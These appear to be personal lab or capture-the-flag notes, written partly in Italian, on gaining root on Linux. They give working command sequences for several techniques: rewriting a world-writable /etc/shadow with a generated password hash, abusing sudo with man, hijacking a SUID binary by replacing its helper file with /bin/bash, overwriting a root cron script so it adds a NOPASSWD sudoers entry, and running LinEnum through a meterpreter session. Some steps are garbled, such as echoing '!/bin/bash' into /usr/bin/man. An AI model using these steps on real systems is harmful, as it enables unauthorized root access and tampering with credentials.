```

#1. Search for files wich is  writable by all users:
> find / -not -type l -perm -o+w
/dev/zero   [Writable]
/dev/tty    [Writable]
/etc/shadow [Writable]

> ls -l /etc/shadow
> cat /etc/shadow

# Generate a password and edit root users password:
> openssl passwd -1 -salt abc password
> vim /etc/shadow
> su
> enter password: password





#2. Search for files (meglio se binary file, in modo da poter lanciare la shell) wich have SETUID permissions:
> find / -user root -perm -4000 -exec ls -ldb {} \;
[No misconfiguration - check other files such as sudo configuration]

> sudo -l
[NOPASSWD: /usr/bin/man]
Ciò significa che il comando "man", può essere eseguito lanciando il comando sudo senza l'utilizzo di una password.
> sudo man ls
> edit man and add a bash shell 
> echo "!/bin/bash" >> /usr/bin/man
> sudo man ls
> whoami
[root]


#2.1 Cerco bynary file che viene eseguito con il SUID, che simboleggia che il file binario e i suoi processi vengono runnati con privilegi da root.
Cerco eventualmente file che vengono eseguiti all'interno, in modo da poter modificare quel file e lanciare comandi da lì pe spawnare una shell da root.

> -rwsr-xr-x welcome
> file welcome
> strings welcome
[Trovo la word "greetings" e ipotizzo vada a lanciare quel file]  

Cancello il file "greetings" e ne creo un'altro, con al suo interno il contenuto di /bin/bash (che permetterà di essere lanciato da root e spawnare una shell root):
> rm greetings
> cp /bin/bash greetings

Run welcome:
> ./welcome

Ganed shell root:
> whoami
[root]




#3. Cron Jobs - File writable
Il mio obiettivo è poter diventare root, devo cercare dei file sul quale ho i permessi di write + execute + file o cron job task che vanno a scrivere dei file con permessi da root che verranno poi eseguiti per poter elevare i miei privilegi andando magari a inserire il mio user all'interno dei sudoers.
Oppure posso cercare un file sul quale solo l'utente root ha i permessi.
Cercare altri file con lo stesso nome, o file che contengono al loro interno il nome del file (magari c'è qualche file .sh che va a creare/aggiornare quel file ogni tot minuti).
Es. Stesso file presente in /tmp, che potrebbe suggerire che c'è un processo cron, che ogni tot minuti prende il file da /tmp e lo copia inserendolo in un'altra directory.
In questo modo posso cercare come viene scritto quel file in /tmp, per andare a cercare dei file .sh che lo scrivono in modo che quando verrà eseguito quel file, verranno eseguiti comandi arbitrari da root che ho precedentemente inserito (es. nuovi utenti sudoers no passwd in /etc/sudoers). 

# Posso cercare file presenti sia nella /tmp, che in altre directory (simboleggia magari che quei file vengono overwritten ogni tot minuti).

# File "message" with -rw- root root permissions - Find other file:
> find / -name "message" 2>/dev/null
[ Ottengo /tmp/message ]

# Questo significa che ci sarà un scripts/binary che copia il file "message" da /tmp in /Desktop. Solitamente posso usare directory come "/etc", "/opt", "/usr".
# Greppo per cercare file di shell che avranno come ouput quella cartella nel bash:
> grep -nri "/tmp/message" /usr
[ Ottengo  file .sh in /usr/local/share/copy.sh] 

Sulla shell ho i permessi di scrittura, non ho un text editor sul systema quindi uso le echo/printf:

> printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh

> cat /usr/local/share/copy.sh
echo "student ALL=NOPASSWD:ALL" >> /etc/sudoers

> sudo -l
> sudo su
Got root priviledges
get the flag







#5. Linux PrivEsc - Automation 
- LinEnum bash script that automates common linux local enumeration

> https://github.com/rebootuser/LinEnum
> ./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
> Go back to meterpreter session
> session 1
cd /tmp
upload /root/Desktop/LinEnum.sh
shell
/bin/bash -i
> id
> chmod +x LinEnum.sh
./LinEnum.sh


```